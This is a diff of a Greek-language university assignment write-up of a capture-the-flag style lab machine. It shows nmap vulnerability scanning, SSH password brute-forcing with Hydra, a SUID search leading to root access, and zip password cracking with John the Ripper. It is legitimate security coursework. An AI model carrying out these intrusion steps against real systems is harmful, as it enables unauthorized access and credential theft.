-|     	PRION:CVE-2022-21331	2.9	https://vulners.com/prion/PRION:CVE-2022-21331
-|     	PRION:CVE-2022-21325	2.9	https://vulners.com/prion/PRION:CVE-2022-21325
-|     	PRION:CVE-2022-21324	2.9	https://vulners.com/prion/PRION:CVE-2022-21324
-|     	PRION:CVE-2022-21323	2.9	https://vulners.com/prion/PRION:CVE-2022-21323
-|     	PRION:CVE-2022-21321	2.9	https://vulners.com/prion/PRION:CVE-2022-21321
-|     	PRION:CVE-2022-21319	2.9	https://vulners.com/prion/PRION:CVE-2022-21319
-|     	PRION:CVE-2022-21317	2.9	https://vulners.com/prion/PRION:CVE-2022-21317
-|     	PRION:CVE-2022-21313	2.9	https://vulners.com/prion/PRION:CVE-2022-21313
-|     	PRION:CVE-2022-21312	2.9	https://vulners.com/prion/PRION:CVE-2022-21312
-|     	PRION:CVE-2022-21311	2.9	https://vulners.com/prion/PRION:CVE-2022-21311
-|     	PRION:CVE-2022-39402	2.1	https://vulners.com/prion/PRION:CVE-2022-39402
-|     	PRION:CVE-2022-21460	2.1	https://vulners.com/prion/PRION:CVE-2022-21460
-|     	PRION:CVE-2022-21451	2.1	https://vulners.com/prion/PRION:CVE-2022-21451
-|     	PRION:CVE-2022-21444	2.1	https://vulners.com/prion/PRION:CVE-2022-21444
-|     	PRION:CVE-2022-21302	2.1	https://vulners.com/prion/PRION:CVE-2022-21302
-|     	PRION:CVE-2022-21254	2.1	https://vulners.com/prion/PRION:CVE-2022-21254
-|     	PRION:CVE-2021-35632	2.1	https://vulners.com/prion/PRION:CVE-2021-35632
-|     	PRION:CVE-2021-35608	2.1	https://vulners.com/prion/PRION:CVE-2021-35608
-|     	PRION:CVE-2022-21625	1.7	https://vulners.com/prion/PRION:CVE-2022-21625
-|     	PRION:CVE-2022-21595	1.7	https://vulners.com/prion/PRION:CVE-2022-21595
-|     	PRION:CVE-2021-22570	1.7	https://vulners.com/prion/PRION:CVE-2021-22570
-|_    	PRION:CVE-2022-21611	0.8	https://vulners.com/prion/PRION:CVE-2022-21611
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds
-
-```
-
 
 ---
 
-### Identifying exploits 
+## Identifying exploits 
 
 Απο το script αυτο μπορουμε να δουμε οτι ο υπολογιστης 1.9 τρεχει ενα web server με την υπηρεσια apache. 
 Συγκεκριμενα οταν συνδεομαστε στο url http://192.168.1.9:80 βλεπουμε το περιεχομενο της σελιδας 
@@ -597,7 +368,7 @@ The password and connection string for the database are stored in a yml file. To
 ```
 
 
-#### Exploiting Vulnerabilities
+## Exploiting Vulnerabilities
 
 Exploiting using the vulnerability: 
 
@@ -632,10 +403,16 @@ whatweb http://$ipt
 ```
 %%
 
-## Gaining Access 
+
+---
+<div style="page-break-after: always;"></div>
+
+---
+
+# Exploitation 
 
 
-### Connecting to database 
+## Connecting to database 
 
 Συνδεομαστε στην βαση δεδομενων : 
 
@@ -827,7 +604,7 @@ if __name__ == "__main__":
 ```
 
 
-### connecting to ssh 
+## connecting to ssh 
 
 Δοκιμαζουμε καποιο απο τα passwords : 
 
@@ -868,7 +645,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-03 00:11:
 ```
 
 
-## Connecting with ssh as travis
+### Connecting with ssh as travis
 
 Οποτε μπορουμε να συνδεθουμε σαν Travis με τον κωδικο 
 
@@ -907,7 +684,7 @@ Sorry, user travis may not run sudo on debian.
 
 Οποτε θα κοιταξουμε αν ο χρηστης dexter εχει περισσοτερα δικαιωματα στον server. 
 
-## Connecting with ssh as travis
+### Connecting with ssh as dexter
 
 
 ```bash
@@ -940,9 +717,14 @@ I need to find out if there is a vulnerability or not.
 ```
 
 
-## Privilege Escalation
+---
+<div style="page-break-after: always;"></div>
 
-### Checking
+---
+
+# Privilege Escalation
+
+## Checking
 
 Ελεγχουμε να δουμε τι μπορει να κανει ο dexter σαν sudo : 
 
@@ -980,7 +762,7 @@ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 ```
 
 
-### Executing
+## Executing
 
 Το πρωτο αρχειο  που βλεπουμε ειναι το `/opt/get_access`
 
@@ -1179,9 +961,78 @@ root@debian:~#
 ```
 
 
-### Root user access 
+## Root user access 
+
+```bash
+root@debian:/root# ls
+```
+
+```
+encrypted.zip  root.txt  system.info
+```
 
 
+```bash
+strings root.txt 
+```
+
+```
+ICA{Next_Generation_Self_Renewable_Genetics}
+```
+
+
+Κατεβαζουμε το encrypted.zip αρχειο. 
+
+Βλεπουμε 
+
+```bash
+unzip encrypted.zip 
+```
+
+```
+Archive:  encrypted.zip
+[encrypted.zip] ../script.sh password: 
+```
+
+
+---
+<div style="page-break-after: always;"></div>
+
+---
+
+# Password Cracking Zip 
+
+
+
+Για να σπασουμε τον κωδικο του zip θα αξιοποιησουμε το προγραμμα john the ripper 
+
+```bash
+zip2john encrypted.zip > encrypted.zip.hash
+```
+
+```bash1
+ver 1.0 efh 5455 efh 7875 encrypted.zip/../script.sh PKZIP Encr: 2b chk, TS_chk, cmplen=48, decmplen=36, crc=3014D7B9 ts=9C30 cs=9c30 type=0
+```
+
+
+```bash
+john encrypted.zip.hash  
+```
+
+```
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 8 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+Proceeding with incremental:ASCII
+
+
+```
 
 
 ----
+
+[Table Of Contents](UNI/Semester-9/ComputerSecurity/assignments/assignment-working.md#Table%20Of%20Contents)
